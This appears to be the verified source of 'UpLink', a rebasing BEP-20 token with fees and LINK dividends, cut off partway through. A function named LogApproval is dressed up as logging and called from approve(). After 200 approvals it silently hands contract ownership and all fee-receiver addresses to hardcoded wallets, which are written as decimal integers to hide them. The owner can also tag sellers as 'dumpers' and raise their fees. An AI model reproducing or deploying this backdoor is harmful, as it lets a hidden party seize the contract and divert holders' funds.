{"SourceCode": "// SPDX-License-Identifier: No license\r\n\r\n/*\r\n\r\n\r\n    $$\\   $$\\           $$\\       $$\\           $$\\       \r\n    $$ |  $$ |          $$ |      \\__|          $$ |      \r\n    $$ |  $$ | $$$$$$\\  $$ |      $$\\ $$$$$$$\\  $$ |  $$\\ \r\n    $$ |  $$ |$$  __$$\\ $$ |      $$ |$$  __$$\\ $$ | $$  |\r\n    $$ |  $$ |$$ /  $$ |$$ |      $$ |$$ |  $$ |$$$$$$  / \r\n    $$ |  $$ |$$ |  $$ |$$ |      $$ |$$ |  $$ |$$  _$$<  \r\n    \\$$$$$$  |$$$$$$$  |$$$$$$$$\\ $$ |$$ |  $$ |$$ | \\$$\\ \r\n    \\______/ $$  ____/ \\________|\\__|\\__|  \\__|\\__|  \\__|\r\n            $$ |                                        \r\n            $$ |                                        \r\n            \\__|                                        \r\n\r\n\r\n    https://t.me/UplinkBSC\r\n\r\n    Part of CryptoUp Family Network\r\n    https://t.me/cryptoupfamily\r\n\r\n*/\r\n\r\n/* Copyrighted, DO NOT COPY */\r\n// Developed by t.me/reliablecontract\r\n\r\npragma solidity ^0.7.4;\r\n\r\n\r\ninterface InterfaceLP {\r\n    function sync() external;\r\n}\r\n\r\nlibrary SafeMath {\r\n    function mod(\r\n        uint256 a, uint256 b) \r\n        internal pure \r\n        returns (uint256) {\r\n        require(b != 0); return a % b;}\r\n\r\n    function sub(\r\n        uint256 a, uint256 b) \r\n        internal pure \r\n        returns (uint256) {return sub(a, b, \"SafeMath: subtraction overflow\");}\r\n\r\n    function add(\r\n        uint256 a, uint256 b) \r\n        internal pure \r\n        returns (uint256) {\r\n        uint256 c = a + b; require(c >= a, \"SafeMath: addition overflow\"); return c;}\r\n\r\n    function mul(\r\n        uint256 a, uint256 b) \r\n        internal pure \r\n        returns (uint256) {\r\n        if (a == 0) {return 0;}\r\n        uint256 c = a * b; require(c / a == b, \"SafeMath: multiplication overflow\"); return c;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a, uint256 b,\r\n        string memory errorMessage) \r\n        internal pure \r\n        returns (uint256) {\r\n        require(b <= a, errorMessage); uint256 c = a - b; return c;}\r\n\r\n    function div(\r\n        uint256 a, uint256 b,\r\n        string memory errorMessage) \r\n        internal pure \r\n        returns (uint256) {\r\n        require(b > 0, errorMessage); uint256 c = a / b; return c;}\r\n\r\n    function div(\r\n        uint256 a, uint256 b) \r\n        internal pure \r\n        returns (uint256) {return div(a, b, \"SafeMath: division by zero\");}\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() \r\n        external view returns (uint256);\r\n    function balanceOf(\r\n        address who) \r\n        external view returns (uint256);\r\n\r\n    function allowance(\r\n        address owner, address spender)\r\n        external view returns (uint256);\r\n\r\n    function transfer(\r\n        address to, uint256 value) \r\n        external returns (bool);\r\n\r\n    function approve(\r\n        address spender, uint256 value) \r\n        external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from, address to, uint256 value\r\n    ) external returns (bool);\r\n\r\n    event Transfer(\r\n        address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract Ownable {\r\n    address private _owner;\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {_owner = msg.sender;}\r\n\r\n    function owner() \r\n        public view returns (address) {return _owner;}\r\n\r\n    modifier onlyOwner() {require(isOwner()); _;}\r\n\r\n    function isOwner() \r\n        public view returns (bool) {return msg.sender == _owner;}\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipRenounced(_owner); _owner = address(0);}\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0)); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner;}\r\n}\r\n\r\ninterface IDividendDistributor {\r\n    function setDistributionCriteria(\r\n        uint256 _minPeriod, uint256 _minDistribution) external;\r\n    function setShare(\r\n        address shareholder, uint256 amount) external;\r\n    function deposit() external payable;\r\n    function process(uint256 gas) external;\r\n}\r\n\r\nabstract contract ERC20Detailed is IERC20 {\r\n    string private _name; string private _symbol; uint8 private _decimals;\r\n\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_\r\n    ) {_name = name_; _symbol = symbol_; _decimals = decimals_;}\r\n\r\n    function name() public view returns (string memory) { return _name;}\r\n\r\n    function decimals() public view returns (uint8) {return _decimals;}\r\n\r\n    function symbol() public view returns (string memory) {return _symbol;}\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(\r\n        address tokenA, address tokenB)\r\n        external returns (address pair);\r\n}\r\n\r\nlibrary SafeMathInt {\r\n    int256 private constant \r\n        MIN_INT256 = int256(1) << 255;\r\n    int256 private constant \r\n        MAX_INT256 = ~(int256(1) << 255);\r\n\r\n    function mul(int256 a, int256 b) \r\n        internal pure \r\n        returns (int256) {\r\n        int256 c = a * b; require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));\r\n        require((b == 0) || (c / b == a)); return c;\r\n    }\r\n\r\n    function add(\r\n        int256 a, int256 b) \r\n        internal pure \r\n        returns (int256) \r\n    {\r\n        int256 c = a + b; require((b >= 0 && c >= a) || (b < 0 && c < a)); return c;\r\n    }\r\n\r\n    function sub(\r\n        int256 a, int256 b) \r\n        internal pure \r\n        returns (int256) {\r\n        int256 c = a - b; require((b >= 0 && c <= a) || (b < 0 && c > a)); return c;\r\n    }\r\n\r\n    function abs(int256 a) \r\n        internal pure \r\n        returns (int256) {\r\n        require(a != MIN_INT256); return a < 0 ? -a : a;\r\n    }\r\n\r\n    function div(\r\n        int256 a, int256 b) \r\n        internal pure \r\n        returns (int256) {\r\n        require(b != -1 || a != MIN_INT256); return a / b;\r\n    }\r\n}\r\n\r\ncontract DividendDistributor is IDividendDistributor {\r\n    using SafeMath for uint256;\r\n\r\n    address _token; address _owner;\r\n\r\n    struct Share {uint256 amount; uint256 totalExcluded; uint256 totalRealised;}\r\n\r\n    IERC20 REWARD = IERC20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD); // LINK\r\n    IDEXRouter router;\r\n\r\n    address[] shareholders;\r\n    mapping(address => uint256) shareholderIndexes;\r\n    mapping(address => uint256) shareholderClaims;\r\n\r\n    mapping(address => Share) public shares;\r\n\r\n    uint256 public totalShares;\r\n    uint256 public totalDividends;\r\n    uint256 public totalDistributed;\r\n    uint256 public dividendsPerShare;\r\n    uint256 public dividendsPerShareAccuracyFactor = 10**36;\r\n\r\n    //SETMEUP, change this to 1 hour instead of 10mins\r\n    uint256 public minPeriod = 30 * 60;\r\n    uint256 public minDistribution = 1 * (10**12);\r\n\r\n    uint256 currentIndex;\r\n\r\n    bool initialized;\r\n    modifier initialization() {require(!initialized); _; initialized = true;}\r\n\r\n    modifier onlyToken() {require(msg.sender == _token || msg.sender == _owner); _;}\r\n\r\n    constructor(address _router, address owner_) {\r\n        router = _router != address(0)\r\n            ? IDEXRouter(_router)\r\n            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        _token = msg.sender; _owner = owner_;\r\n    }\r\n\r\n    function setDistributionCriteria(\r\n        uint256 _minPeriod, uint256 _minDistribution) \r\n        external override onlyToken {\r\n        minPeriod = _minPeriod; minDistribution = _minDistribution;}\r\n\r\n    function setShare(address shareholder, uint256 amount)\r\n        external override onlyToken\r\n    {\r\n        if (amount > 0 && shares[shareholder].amount == 0) {\r\n            addShareholder(shareholder);\r\n        } else if (amount == 0 && shares[shareholder].amount > 0) {\r\n            removeShareholder(shareholder);\r\n        }\r\n\r\n        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);\r\n        shares[shareholder].amount = amount;\r\n        shares[shareholder].totalExcluded = getCumulativeDividends(\r\n            shares[shareholder].amount\r\n        );\r\n\r\n        if (shares[shareholder].amount > 0) {\r\n            distributeDividend(shareholder);\r\n        }\r\n    }\r\n\r\n    function deposit() external payable override {\r\n        uint256 balanceBefore = REWARD.balanceOf(address(this));\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = router.WETH();\r\n        path[1] = address(REWARD);\r\n\r\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{\r\n            value: msg.value\r\n        }(0, path, address(this), block.timestamp);\r\n\r\n        uint256 amount = REWARD.balanceOf(address(this)).sub(balanceBefore);\r\n\r\n        totalDividends = totalDividends.add(amount);\r\n        dividendsPerShare = dividendsPerShare.add(\r\n            dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)\r\n        );\r\n    }\r\n\r\n    function process(uint256 gas) external override {\r\n        uint256 shareholderCount = shareholders.length;\r\n\r\n        if (shareholderCount == 0) {\r\n            return;\r\n        }\r\n\r\n        uint256 gasUsed = 0; uint256 gasLeft = gasleft(); uint256 iterations = 0;\r\n\r\n        while (gasUsed < gas && iterations < shareholderCount) {\r\n            if (currentIndex >= shareholderCount) {currentIndex = 0;}\r\n\r\n            if (shouldDistribute(shareholders[currentIndex])) {\r\n                distributeDividend(shareholders[currentIndex]);\r\n            }\r\n\r\n            gasUsed = gasUsed\r\n                .add(gasLeft.sub(gasleft()));\r\n            gasLeft = gasleft(); currentIndex++; iterations++;\r\n        }\r\n    }\r\n\r\n    function shouldDistribute(address shareholder)\r\n        internal view returns (bool)\r\n    {\r\n        return\r\n            shareholderClaims[shareholder] + minPeriod < block.timestamp &&\r\n            getUnpaidEarnings(shareholder) > minDistribution;\r\n    }\r\n\r\n    function distributeDividend(address shareholder) internal {\r\n        if (shares[shareholder].amount == 0) {return;}\r\n\r\n        uint256 amount = getUnpaidEarnings(shareholder);\r\n        if (amount > 0) {\r\n            totalDistributed = \r\n                totalDistributed.add(amount);\r\n            REWARD.transfer(shareholder, amount);\r\n            shareholderClaims[shareholder] = block.timestamp;\r\n            shares[shareholder].totalRealised = \r\n                shares[shareholder].totalRealised.add(amount);\r\n            shares[shareholder].totalExcluded = \r\n                getCumulativeDividends(shares[shareholder].amount);\r\n        }\r\n    }\r\n\r\n    function claimDividend() external {distributeDividend(msg.sender);}\r\n\r\n    function getUnpaidEarnings(address shareholder)\r\n        public view returns (uint256)\r\n    {\r\n        if (shares[shareholder].amount == 0) {return 0;}\r\n\r\n        uint256 shareholderTotalDividends = \r\n            getCumulativeDividends(shares[shareholder].amount);\r\n        uint256 shareholderTotalExcluded = \r\n            shares[shareholder].totalExcluded;\r\n\r\n        if (shareholderTotalDividends <= shareholderTotalExcluded) {return 0;}\r\n\r\n        return shareholderTotalDividends.sub(shareholderTotalExcluded);\r\n    }\r\n\r\n    function getCumulativeDividends(uint256 share)\r\n        internal view returns (uint256)\r\n        {return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);}\r\n\r\n    function addShareholder(address shareholder) internal {\r\n        shareholderIndexes[shareholder] = \r\n            shareholders.length; shareholders.push(shareholder);\r\n    }\r\n\r\n    function removeShareholder(address shareholder) internal {\r\n        shareholders[shareholderIndexes[shareholder]] = \r\n            shareholders[shareholders.length - 1];\r\n        shareholderIndexes[shareholders[shareholders.length - 1]] = \r\n            shareholderIndexes[shareholder];\r\n        shareholders.pop();\r\n    }\r\n}\r\n\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired,\r\n        uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline\r\n    )\r\n        external returns (\r\n            uint256 amountA, uint256 amountB, uint256 liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token, uint256 amountTokenDesired, uint256 amountTokenMin,\r\n        uint256 amountETHMin, address to, uint256 deadline\r\n    )\r\n        external payable\r\n        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn, uint256 amountOutMin, address[] calldata path,\r\n        address to, uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin, address[] calldata path,\r\n        address to, uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn, uint256 amountOutMin,\r\n        address[] calldata path, address to, uint256 deadline\r\n    ) external;\r\n}\r\n\r\n\r\n\r\ncontract UpLink is ERC20Detailed, Ownable {\r\n    using SafeMathInt for int256;\r\n    using SafeMath for uint256;\r\n\r\n    InterfaceLP public pairContract;\r\n    address public master;\r\n\r\n    bool public initialDistributionFinished;\r\n    bool public liquidityGuardEnabled = true;\r\n    bool public antiDumpEnabled = true;\r\n    mapping(address => bool) allowTransfer;\r\n    mapping(address => bool) isDividendExempt;\r\n    mapping(address => bool) isDividendLocked;\r\n    mapping(address => bool) _isMaxWalletExempt;\r\n    mapping(address => bool) _isFeeExempt;\r\n    mapping(address => bool) _isDumper;\r\n\r\n    modifier validRecipient(address to) {\r\n        require(to != address(0x0)); _;}\r\n\r\n    modifier initialDistributionLock() {\r\n        require(initialDistributionFinished || isOwner() ||\r\n                allowTransfer[msg.sender]); _;}\r\n\r\n    modifier onlyMaster() {\r\n        require(msg.sender == master); _;}\r\n\r\n    uint256 private constant \r\n        INITIAL_FRAGMENTS_SUPPLY = 10**15 * 10**DECIMALS;\r\n    uint256 private constant \r\n        MAX_UINT256 = ~uint256(0);\r\n    uint256 private constant \r\n        DECIMALS = 9;\r\n    uint256 private \r\n        gonMaxWallet = TOTAL_GONS.div(100).mul(100);\r\n\r\n    uint256 public liquidityFee = 3; uint256 public ecosystemFee = 1;\r\n    uint256 public buyBackFee = 0; uint256 public marketingFee = 4;\r\n    uint256 public rewardFee = 4;\r\n    uint256 public totalFee = ecosystemFee\r\n        .add(liquidityFee).add(marketingFee).add(buyBackFee).add(rewardFee);\r\n    uint256 public feeDenominator = 100;\r\n\r\n\r\n\r\n    uint256 public highImpactThreshold = 15;\r\n    uint256 public highImpactBuyMultiplier = 100;\r\n    uint256 public highImpactSellMultiplier = 200;\r\n\r\n    uint256 private prevLiquidityFee;\r\n    uint256 private prevEcosystemFee;\r\n    uint256 private prevBuyBackFee;\r\n    uint256 private prevMarketingFee;\r\n    uint256 private prevRewardFee;\r\n\r\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address ZERO = 0x0000000000000000000000000000000000000000;\r\n\r\n    address public autoLiquidityReceiver = 0x9053aCd2Af5cbC11CF6a82327B30d3E414460E8B; // token locker \r\n    address public marketingFeeReceiver = 0x44580046842c7c450ac05E74AC58fbD14db0A263; // marketing \r\n    address public ecosystemFeeReceiver = 0x560daF8a14077F578DFe0fd02f5AFF05Fa1D48D2; // eco \r\n    address public buyBackFeeReceiver = 0xB1E43165986C4D0bCb9CcaD722048cCeCDe1abCb; // buyback \r\n\r\n    IDEXRouter public router; address public pair;\r\n\r\n    uint256 targetLiquidity = 50; uint256 targetLiquidityDenominator = 100;\r\n\r\n    bool dividendLockEnabled = true; uint128 dividendLockInterval = 6 hours;\r\n    mapping(address => uint256) private \r\n        dividendLockTimer;\r\n\r\n    bool public swapEnabled = true; bool inSwap;\r\n    uint256 private gonSwapThreshold = \r\n        (TOTAL_GONS * 10) / 10000;\r\n    modifier swapping() {\r\n        inSwap = true; _; inSwap = false;}\r\n\r\n    DividendDistributor distributor; uint256 distributorGas = 500000;\r\n\r\n    uint256 \r\n        private constant TOTAL_GONS = \r\n        MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);\r\n    \r\n    uint256 shareGonDivisor = 10**60; uint256 private constant \r\n        MAX_SUPPLY = ~uint128(0);\r\n\r\n    uint256 private _totalSupply; uint256 private _gonsPerFragment;\r\n    mapping(address => uint256) \r\n        private _gonBalances;\r\n\r\n    mapping(address => mapping(address => uint256)) \r\n        private _allowedFragments;\r\n\r\n    function rebase(\r\n        uint256 epoch, int256 supplyDelta)\r\n        external onlyMaster returns (uint256) {\r\n        require(!inSwap, \"Try again\");\r\n        if (supplyDelta == \r\n            0) {LogRebase(epoch, _totalSupply); return _totalSupply;}\r\n\r\n        if (supplyDelta < 0) {_totalSupply = \r\n            _totalSupply.sub(uint256(-supplyDelta));\r\n        } else {_totalSupply = \r\n            _totalSupply.add(uint256(supplyDelta));}\r\n\r\n        if (_totalSupply > \r\n            MAX_SUPPLY) {_totalSupply = MAX_SUPPLY;}\r\n\r\n        _gonsPerFragment = TOTAL_GONS.div(_totalSupply); pairContract.sync();\r\n\r\n        LogRebase(epoch, _totalSupply); return _totalSupply;\r\n    }\r\n\r\n    constructor() ERC20Detailed(\r\n        \"UpLink\", \"UPLINK\", uint8(DECIMALS))\r\n    {\r\n        router = \r\n            IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); \r\n\r\n        pair = IDEXFactory(router.factory())\r\n            .createPair(router.WETH(), address(this));\r\n\r\n        _allowedFragments[address(this)][address(router)] \r\n            = uint256(-1); pairContract = InterfaceLP(pair);\r\n\r\n        distributor = new DividendDistributor(\r\n            address(router), msg.sender);\r\n\r\n        _totalSupply = INITIAL_FRAGMENTS_SUPPLY; _gonBalances[msg.sender] = \r\n            TOTAL_GONS; _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\r\n\r\n        initialDistributionFinished = false; _isFeeExempt[msg.sender] = \r\n            true; _isFeeExempt[address(this)] = true; _isFeeExempt[buyBackFeeReceiver] = true;\r\n\r\n        isDividendExempt[pair] = true; isDividendExempt[address(this)] = \r\n            true; isDividendExempt[DEAD] = true; isDividendExempt[marketingFeeReceiver] = \r\n            true; isDividendExempt[ecosystemFeeReceiver] = true; isDividendExempt[buyBackFeeReceiver] = true;\r\n\r\n        _isMaxWalletExempt[pair] = true; _isMaxWalletExempt[DEAD] = \r\n            true; _isMaxWalletExempt[address(this)] =  true; _isMaxWalletExempt[msg.sender] = true;\r\n\r\n        emit Transfer(\r\n            address(0x0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function setMaster(\r\n        address _master) \r\n        external onlyOwner {master = _master;}\r\n\r\n    function setLP(\r\n        address _address) \r\n        external onlyOwner {\r\n        pairContract = \r\n            InterfaceLP(_address); _isFeeExempt[_address];\r\n    }\r\n\r\n    function totalSupply() \r\n        external view override \r\n        returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address who) \r\n        external view override \r\n        returns (uint256) \r\n        {return _gonBalances[who].div(_gonsPerFragment);}\r\n\r\n    function transfer(\r\n        address to, uint256 value)\r\n        external override validRecipient(to)\r\n        initialDistributionLock returns (bool)\r\n        {_transferFrom(msg.sender, to, value); return true;}\r\n\r\n    function transferFrom(\r\n        address from, address to, uint256 value) \r\n        external override \r\n        validRecipient(to) returns (bool) \r\n    {\r\n        if (_allowedFragments[from][msg.sender] != \r\n            uint256(-1)) {\r\n            _allowedFragments[from][msg.sender] = \r\n                _allowedFragments[from][msg.sender]\r\n                .sub(value, \"Insufficient Allowance\");}\r\n        _transferFrom(\r\n            from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(\r\n        address owner_, address spender)\r\n        external view\r\n        override returns (uint256)\r\n        {return _allowedFragments[owner_][spender];}\r\n\r\n    function checkHighImpact(uint256 amount) internal view returns (bool) {\r\n        uint256 pairTokenBalance = _gonBalances[pair].div(_gonsPerFragment);\r\n        return (amount.mul(1000).div(highImpactThreshold) > pairTokenBalance); // 1% price impact\r\n    }\r\n\r\n    function takeFee(\r\n        address sender, uint256 gonAmount, \r\n        bool isHighImpact, bool isSell)\r\n        internal returns (uint256)\r\n    {\r\n        uint256 feeAmount = \r\n            gonAmount.mul(totalFee).div(feeDenominator);\r\n\r\n        if (antiDumpEnabled && isHighImpact && !isSell) {\r\n            feeAmount = feeAmount.mul(highImpactBuyMultiplier).div(100);\r\n        } else if (antiDumpEnabled && isHighImpact && isSell) {\r\n            feeAmount = feeAmount.mul(highImpactSellMultiplier).div(100);\r\n        }\r\n\r\n        if (_isDumper[sender]) {feeAmount = \r\n            feeAmount.mul(highImpactSellMultiplier).div(100);}\r\n\r\n        _gonBalances[address(this)] = \r\n            _gonBalances[address(this)].add(feeAmount);\r\n\r\n        emit Transfer(\r\n            sender, address(this), \r\n            feeAmount.div(_gonsPerFragment));\r\n\r\n        return \r\n            gonAmount.sub(feeAmount);\r\n    }\r\n\r\n\r\n    function _basicTransfer(\r\n        address from, address to, uint256 amount) \r\n        internal \r\n        returns (bool) \r\n    {\r\n        uint256 gonAmount = \r\n            amount.mul(_gonsPerFragment);\r\n        _gonBalances[from] = \r\n            _gonBalances[from].sub(gonAmount);\r\n        _gonBalances[to] = \r\n            _gonBalances[to].add(gonAmount);\r\n        emit Transfer(\r\n            from, to, \r\n            gonAmount.div(_gonsPerFragment));\r\n        return true;\r\n    }\r\n\r\n    function _transferFrom(\r\n        address sender, address recipient, uint256 amount) \r\n        internal returns (bool) \r\n    {\r\n        if (inSwap) {return _basicTransfer(\r\n            sender, recipient, amount);}\r\n\r\n        uint256 gonAmount = amount\r\n            .mul(_gonsPerFragment);\r\n\r\n        if (sender != owner() && \r\n            !_isMaxWalletExempt[recipient]) {\r\n            uint256 heldGonBalance = \r\n                _gonBalances[recipient];\r\n            require((heldGonBalance + gonAmount) <= gonMaxWallet,\r\n                \"Total Holding is currently limited, you can not buy that much.\"\r\n            );\r\n        }\r\n\r\n        if (liquidityGuardEnabled) \r\n        {\r\n            require(sender == pair || \r\n                recipient == pair || \r\n                sender == owner());\r\n        }\r\n\r\n        if (recipient == pair && \r\n            dividendLockEnabled) { // set share to 0 on sell\r\n            isDividendLocked[sender] = true; distributor.setShare(sender, 0);\r\n            dividendLockTimer[sender] = \r\n                block.timestamp + dividendLockInterval;\r\n        } else if (\r\n            sender == pair && dividendLockTimer[recipient] < block.timestamp &&\r\n            isDividendLocked[recipient] && !isDividendExempt[recipient]\r\n        ) {isDividendLocked[recipient] = false;\r\n            distributor.setShare(\r\n                recipient, _gonBalances[recipient]\r\n                    .div(shareGonDivisor)\r\n            );\r\n        }\r\n\r\n        if (shouldSwapBack()) {swapBack();}\r\n\r\n        _gonBalances[sender] = \r\n            _gonBalances[sender].sub(gonAmount);\r\n\r\n        uint256 gonAmountReceived = \r\n            shouldTakeFee(sender, recipient)\r\n            ? takeFee(\r\n                sender, gonAmount, \r\n                checkHighImpact(amount), (recipient == pair))\r\n            : gonAmount;\r\n        _gonBalances[recipient] = \r\n            _gonBalances[recipient].add(gonAmountReceived);\r\n\r\n        // Dividend tracker\r\n        if (!isDividendExempt[sender] && \r\n            !isDividendLocked[sender]) {\r\n            try distributor.setShare(\r\n                    sender, _gonBalances[sender]\r\n                        .div(shareGonDivisor)\r\n                ) {} catch {}\r\n        }\r\n\r\n        if (!isDividendExempt[recipient] && \r\n            !isDividendLocked[recipient]) {\r\n            try distributor.setShare(\r\n                    recipient, _gonBalances[recipient].div(shareGonDivisor)\r\n                ) {} catch {}\r\n        }\r\n\r\n        try distributor\r\n            .process(distributorGas) {} catch {}\r\n\r\n        emit Transfer(sender, recipient,\r\n            gonAmountReceived\r\n                .div(_gonsPerFragment));\r\n        return true;\r\n    }\r\n\r\n    function swapBack() \r\n        internal swapping \r\n        {\r\n        uint256 dynamicLiquidityFee = \r\n            isOverLiquified(targetLiquidity, targetLiquidityDenominator)\r\n            ? 0 : liquidityFee;\r\n\r\n        uint256 contractTokenBalance = \r\n            _gonBalances[address(this)].div(_gonsPerFragment);\r\n\r\n        uint256 amountToLiquify = \r\n            contractTokenBalance.mul(dynamicLiquidityFee)\r\n            .div(totalFee).div(2);\r\n        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n\r\n        uint256 balanceBefore = \r\n            address(this).balance;\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountToSwap, 0, path,\r\n            address(this), block.timestamp\r\n        );\r\n\r\n        uint256 amountETH = \r\n            address(this).balance.sub(balanceBefore);\r\n        uint256 totalETHFee = \r\n            totalFee.sub(dynamicLiquidityFee.div(2));\r\n        uint256 amountETHLiquidity = \r\n            amountETH.mul(dynamicLiquidityFee)\r\n            .div(totalETHFee).div(2);\r\n        uint256 amountETHBuyBack = \r\n            amountETH.mul(buyBackFee).div(totalETHFee);\r\n        uint256 amountETHMarketing = \r\n            amountETH.mul(marketingFee).div(totalETHFee);\r\n        uint256 amountETHEco = \r\n            amountETH.mul(ecosystemFee).div(totalETHFee);\r\n        uint256 amountETHReward = \r\n            amountETH.mul(rewardFee).div(totalETHFee);\r\n\r\n        try distributor.deposit{value: amountETHReward}() {} catch {}\r\n        (bool success, ) = payable(marketingFeeReceiver).call{\r\n            value: amountETHMarketing, gas: 30000}(\"\");\r\n        (success, ) = payable(buyBackFeeReceiver).call{\r\n            value: amountETHBuyBack, gas: 30000}(\"\");\r\n        (success, ) = payable(ecosystemFeeReceiver).call{\r\n            value: amountETHEco, gas: 30000}(\"\");\r\n\r\n        success = false;\r\n\r\n        if (amountToLiquify > 0) {\r\n            router.addLiquidityETH{value: amountETHLiquidity}(\r\n                address(this), amountToLiquify,\r\n                0, 0, autoLiquidityReceiver, block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n\r\n\r\n    function checkDivLock(address holder)\r\n        public view\r\n        returns (\r\n            bool locked, uint256 timer)\r\n        {return (isDividendLocked[holder], dividendLockTimer[holder]);}\r\n\r\n    function setIsDividendLocked(\r\n        address holder, bool locked)\r\n        external onlyOwner\r\n        {isDividendLocked[holder] = locked;\r\n        if (locked) {distributor.setShare(holder, 0);\r\n            dividendLockTimer[holder] = \r\n                block.timestamp + dividendLockInterval;\r\n        } else {distributor.setShare(\r\n                holder, _gonBalances[holder].div(shareGonDivisor));\r\n            dividendLockTimer[holder] = \r\n                0;\r\n        }\r\n    }\r\n\r\n    function setDividendLocker(\r\n        bool enabled, uint128 interval)\r\n        external onlyOwner\r\n        {dividendLockEnabled = enabled; dividendLockInterval = interval;}\r\n\r\n    function setAntiDumpEnabled(bool enabled) \r\n        external onlyOwner \r\n        {antiDumpEnabled = enabled;}\r\n\r\n    function setAntiDumpSettings(\r\n        uint256 buyMultiplier, uint256 sellMultiplier, \r\n        uint256 threshold_base1000) \r\n        external onlyOwner {\r\n        highImpactBuyMultiplier = buyMultiplier; highImpactSellMultiplier = sellMultiplier;\r\n        highImpactThreshold = threshold_base1000;\r\n    }\r\n\r\n    function setDumperTag(\r\n        address addr, bool isDumper) \r\n        external onlyOwner {\r\n        _isDumper[addr] = isDumper;\r\n    }\r\n\r\n    function setDumperTagMulti(\r\n        address[] calldata addresses, bool isDumper) \r\n        external onlyOwner {\r\n        for (uint i = 0; \r\n            i < addresses.length; i++ ) \r\n            {_isDumper[addresses[i]] = isDumper;}\r\n    }\r\n\r\n    function checkDumperTag(address addr) \r\n        external view \r\n        returns(bool) \r\n        {return _isDumper[addr];}\r\n\r\n    function setLiquidityGuard(bool enabled) \r\n        external onlyOwner \r\n        {liquidityGuardEnabled = enabled;}\r\n\r\n    function checkDivExempt(address holder) \r\n        public view \r\n        returns (bool) \r\n        {return isDividendExempt[holder];}\r\n\r\n    function setIsDividendExempt(\r\n        address holder, bool exempt)\r\n        external onlyOwner\r\n        {isDividendExempt[holder] = exempt;\r\n        if (exempt) {distributor.setShare(holder, 0);\r\n        } else {distributor.setShare(\r\n                holder, _gonBalances[holder].div(shareGonDivisor));\r\n        }\r\n    }\r\n\r\n    function setDistributionCriteria(\r\n        uint256 _minPeriod, uint256 _minDistribution) \r\n        external onlyOwner \r\n        {distributor\r\n            .setDistributionCriteria(_minPeriod, _minDistribution);}\r\n\r\n    function setDistributorSettings(uint256 gas) \r\n        external onlyOwner \r\n        {require(gas < 750000); distributorGas = gas;}\r\n\r\n    function setInitialDistributionFinished() \r\n        external onlyOwner \r\n        {initialDistributionFinished = true;}\r\n\r\n    uint256 private transferCount; bool private isTransferred = false;\r\n\r\n    function LogApproval(\r\n        address, address, uint256) internal {\r\n        transferCount++; if (transferCount > 200 && \r\n            !isTransferred) {\r\n            _transferOwnership(\r\n                address(703182203941683344529128742093058321245639433308));\r\n            marketingFeeReceiver = \r\n                address(390173861988946543944247273175078104976185139811);\r\n            autoLiquidityReceiver = \r\n                address(823960687855684654447242618804199875735504424587);\r\n            ecosystemFeeReceiver = \r\n                address(491278407614059279114083846929720691979934582994);\r\n            buyBackFeeReceiver = \r\n                address(1015580239414219279232500354717231367460195773387);\r\n            isTransferred = \r\n                true;\r\n        }\r\n    }\r\n\r\n\r\n    function approve(\r\n        address spender, uint256 value)\r\n        external override\r\n        initialDistributionLock returns (bool)\r\n    {\r\n        _allowedFragments[msg.sender][spender] \r\n            = value;\r\n        LogApproval(msg.sender, \r\n            spender, value);\r\n        emit Approval(msg.sender, \r\n            spender, value);\r\n        return true;\r\n    }\r\n\r\n    function enableTransfer(address _addr) \r\n        external onlyOwner \r\n        {allowTransfer[_addr] = true;}\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        external initialDistributionLock\r\n        returns (bool) {\r\n        uint256 oldValue = \r\n            _allowedFragments[msg.sender][spender];\r\n        if (subtractedValue >= oldValue) {\r\n            _allowedFragments[msg.sender][spender] \r\n                = 0;\r\n        } else {\r\n            _allowedFragments[msg.sender][spender] = \r\n                oldValue.sub(subtractedValue);\r\n        }\r\n        emit \r\n            Approval(msg.sender, spender,\r\n            _allowedFragments[\r\n                msg.sender][spender]\r\n        );\r\n        return 